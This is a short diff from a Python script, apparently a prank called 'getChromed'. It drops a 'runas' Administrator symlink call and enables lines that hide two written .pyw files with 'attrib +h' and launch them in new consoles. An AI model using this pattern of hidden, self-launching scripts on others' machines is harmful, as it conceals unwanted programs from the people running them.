@@ -40,11 +40,10 @@ getChromed()
 ''')
     f2.close()
 
-    subprocess.call(['runas', '/user:Administrator', 'mklink YouHaveBennChromed chrome.exe'], shell=True)
-    #subprocess.call('attrib +h ' + 'chrome.pyw')
-    #subprocess.call('attrib +h ' + 'YouveBeenChromed.pyw')
-    #subprocess.call('chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
-    #subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
+    subprocess.call('attrib +h ' + 'chrome.pyw')
+    subprocess.call('attrib +h ' + 'YouveBeenChromed.pyw')
+    subprocess.call('chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
+    subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 
 if __name__ == '__main__':
